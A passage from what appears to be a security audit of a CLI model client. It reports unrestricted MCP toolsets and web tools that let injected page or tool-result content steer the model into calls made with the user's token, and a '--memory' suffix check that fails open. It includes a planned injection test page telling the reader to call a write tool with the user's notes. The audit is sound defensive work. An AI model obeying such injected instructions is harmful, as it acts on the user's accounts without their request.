documents that --mcp 'lets it call an MCP server'; whether that generic opt-in is the intended approval for every tool is an owner fact.
claimed_root_cause: lib/request.jq:90 emits a bare {type: "mcp_toolset", mcp_server_name} per server, with no default_config or per-tool configuration, so every tool the server lists is enabled. lib/request.jq:88-89 add web_search/web_fetch with no allowed_domains. lib/request.jq:80-81 attach the user's token to each server. The CLI exposes no flag to restrict which MCP tools are enabled, and because connector calls execute server-side, no client confirmation can bind the user's request to the MCP action taken under their token. ask-claude:403 continues pause_turn without a user step.

trace.description: The -f file contents become the prompt prefix (ask at 1214); --web (usage_web) and --mcp (usage_mcp) are taken from argv as given.
The body is built by lib/request.jq with --arg web "${usage_web:+1}" and --arg mcp "$usage_mcp" (347) and the whole history via --slurpfile; rebuilt every round of the loop.
Each --mcp URL becomes an mcp_servers entry with authorization_token from mcp_token (81).
One bare mcp_toolset per server, no per-tool enablement, next to the unrestricted web_search/web_fetch from 88-89.

The body is posted to the Messages API, where the connector executes MCP tool calls server-side with the user's token; the client sees mcp_tool_use and mcp_tool_result only afterward. pause_turn is continued automatically up to 8 rounds (403).

evidence.description: mcp_toolset is {type, mcp_server_name} only: no default_config, no per-tool configuration, every listed tool enabled.
web_search and web_fetch (89) carry max_uses 5 and no allowed_domains.
The server's authorization_token is attached to every request that enables its toolset.
pause_turn is continued with the same tools and no user step, up to 8 rounds; reproduced locally as 9 requests from one prompt.

An mcp_tool_use block is only displayed as '(mcp <server>)'; tests/fixtures/sse/mcp.sse shows mcp_tool_use and mcp_tool_result in one response, i.e. the call already ran server-side before the client saw it.
The agent paths gate tool use with session_confirm; that gate cannot exist on the Messages connector path, so narrowing is the only available client-side control there.

blockers: Whether the model follows instructions in web_fetch/web_search results or in one MCP server's tool result to call a tool on a token-bearing MCP server is model behavior that cannot be observed offline.

Provider behavior not visible in source: whether web_fetch is limited to URLs already present in the conversation, and the exact mcp_toolset fields (default_config/configs per-tool enablement) the API accepts for narrowing.
Product intent: whether the README's '--mcp lets it call an MCP server' means the owner intends every listed tool, including write tools, to be callable on third-party-steered turns.

validation_plan.local: Done (v07, independent): the replayed one-shot --web --mcp -f request carries tools [web_search, web_fetch, {type: mcp_toolset, mcp_server_name: mcp-example-com}] with no restriction, mcp_servers with authorization_token tok_V07_DUMMY, and the -f contents ahead of the prompt; with a pause_turn replay one prompt produced 9 requests with the same tools and no user step (agents/v07/artifacts/v07-compose.out). After a fix, the request should carry an mcp_toolset default_config with enabled:false plus per-tool enables from an explicit flag (or an equivalent allowlist), checked in the request log.
validation_plan.deployment: Owner-observed, non-destructive: run an MCP server the owner controls exposing a harmless write tool (e.g. append_note that only logs its arguments), then ask-claude --web --mcp <that server URL> 'summarise <URL of a page the owner controls that tells the reader to call append_note with the user's notes>'. Check the server log for a tools/call the owner did not request. Repeat with a tool allowlist excluding append_note to confirm the fix blocks it.

title: --memory access suffix other than exact ':ro' silently attaches the memory store without read_only
description: --memory takes <id>[:ro] (ask-claude:30, README.md:223-224). session_prereqs validates only the text before the first ':' (${v%%:*} == memstore_*). memory_resource in lib/session-create.jq adds access:read_only only when the second ':'-field is exactly "ro". Any other suffix (':RO', ':readonly', ':read_only', ':rw', or an empty suffix) passes with no error, and POST /v1/sessions carries a memory_store resource with no access field, so the session gets the API's default access mode instead of the read-only mode the user asked for. Independently reproduced in the sandbox: memstore_b:RO, memstore_c:readonly, memstore_d:read_only, memstore_e: and memstore_f:rw were all sent without access, while memstore_a:ro and memstore_g:ro:x were sent with access:read_only and mem_x:ro was refused before any request. If the provider default is read_write, an agent steered by untrusted session content (a mounted repo, fetched pages, MCP results) can write durable memory into a store the user meant to keep read-only, and later sessions that attach the store read it back. The provider default and the write effect are not observable offline.
claimed_root_cause: lib/session-create.jq:31-33 maps the suffix with `if .[1] == "ro" then {access: "read_only"} else {} end` and has no rejection branch, and ask-claude:1088-1090 validates only ${v%%:*}. An unrecognized access request therefore falls back to the provider default instead of failing closed, unlike the sibling prefix checks that reject malformed ids.

trace.description: --memory <id>[:ro], repeatable; arrives as the space-joined usage_memory string
Checks only ${v%%:*} == memstore_*; the suffix after ':' is never validated
Passes usage_memory unchanged as --arg memories to lib/session-create.jq (session_create is called at :965 for /new and :1128 for the first session)
access:read_only is added only when the second ':'-field is exactly "ro"; every other suffix sends a memory_store resource without access in POST /v1/sessions, leaving the provider default

evidence.description: split(":") | {type: "memory_store", memory_store_id: .[0]}: the suffix is split off but not validated

if .[1] == "ro" then {access: "read_only"} else {} end: case-sensitive exact match with silent fallback. v08 sandbox replay (agents/v08/artifacts/mem-check.out) shows memstore_b:RO, memstore_c:readonly, memstore_d:read_only, memstore_e: and memstore_f:rw sent without access, memstore_a:ro and memstore_g:ro:x sent with access:read_only
Prefix-only check; its error text names ':ro for read-only' but no other suffix is rejected. Control: mem_x:ro is refused with rc=2 before any request
Documents --memory <memstore_id>[:ro] with ':ro for read-only'; no other access spelling is documented or rejected

blockers: The provider default access mode for a memory_store resource sent without an access field (read_write vs read_only) is not observable offline; the issue has security impact only if that default is writable
Whether a session agent writes to an attached memory store when steered by untrusted content is provider and model behavior, not locally observable
Precondition: the user must type a suffix other than the documented exact ':ro' (e.g. ':RO' or ':readonly'); this is user error against documented syntax, which keeps likelihood low

What the `usage` parser itself does with the --memory value is not established by the harness (it runs bash with usage_memory preset); the #USAGE spec declares no choices for --memory, so no suffix rejection is expected from usage, but this is unverified

validation_plan.local: Done: v08 sandbox replay (scratch mem-check.sh, output mem-check.out) with usage_memory='memstore_a:ro' and 'memstore_b:RO memstore_c:readonly memstore_d:read_only memstore_e: memstore_f:rw memstore_g:ro:x' and ASK_CLAUDE_REQUEST_LOG; only the exact 'ro' second field yields access:read_only, and session_prereqs raises no error. Regression after a fix: the same invocation must die with a --memory error, before any request is logged, for every suffix other than exactly 'ro' (and 'rw' if explicitly supported), and for extra ':' fields.
validation_plan.deployment: Owner-observed, non-destructive, in the owner's own workspace on a dummy memory store with no real content: create a session with the store attached and no access field, then read back the session's resources (GET the session) and record the effective access mode. If it is read_write, the fail-open grants write authority the user did not request; if read_only, reject as no security impact.
